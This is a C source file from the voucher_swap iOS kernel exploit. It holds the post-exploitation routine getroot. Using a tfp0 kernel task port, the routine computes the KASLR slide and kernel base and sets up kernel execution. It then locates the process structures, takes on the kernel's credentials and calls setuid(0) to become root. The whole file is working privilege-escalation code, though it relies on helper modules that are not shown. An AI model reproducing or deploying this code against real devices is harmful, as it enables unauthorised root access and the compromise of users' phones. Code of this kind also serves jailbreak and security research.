//
//  postsploit.c
//  voucher_swap
//
//  Created by Yaniv Mashat on 1/30/19.
//  Copyright © 2019 Brandon Azad. All rights reserved.
//

#include "postsploit.h"
#include <mach/mach.h>
#include "kmem.h"
#include "kutils.h"
#include "patchfinder64.h"
#include "kexecute.h"
#include "kernel_call/user_client.h"
#include "log.h"
mach_port_t tfpzero = MACH_PORT_NULL;


int getroot(mach_port_t tfp0){
    
    if (!MACH_PORT_VALID(tfp0)) {
        printf("tfp0 isnt valid!\n");
        return  -1;
    }
    
     tfpzero = tfp0;
     uint64_t slide = get_kaslr_slide();
    printf("slide: 0x%016llx\n", slide);
    uint64_t kernel_base = slide + 0xFFFFFFF007004000;
    INFO("kernel_base at: 0x%x", kernel_base);
    
    
    init_kernel(kernel_base, NULL);
    
    init_kexecute();
    
    // Get our and the kernels struct proc from allproc
    uint32_t our_pid = getpid();
    uint64_t our_proc = get_proc_struct_for_pid(our_pid);
    uint64_t kern_proc = get_proc_struct_for_pid(0);
    
    if (!our_proc || !kern_proc) {
     
        goto out;
    }
    
    printf("our proc is at 0x%016llx\n", our_proc);
    printf("kern proc is at 0x%016llx\n", kern_proc);
    
    // Properly copy the kernel's credentials so setuid(0) doesn't crash
    uint64_t field, cred;
    assume_kernel_credentials(&field, &cred);
    
    setuid(0);
    return 0;
out:
    term_kexecute();
    term_kernel();
    return -1;
    
    
    
   
}
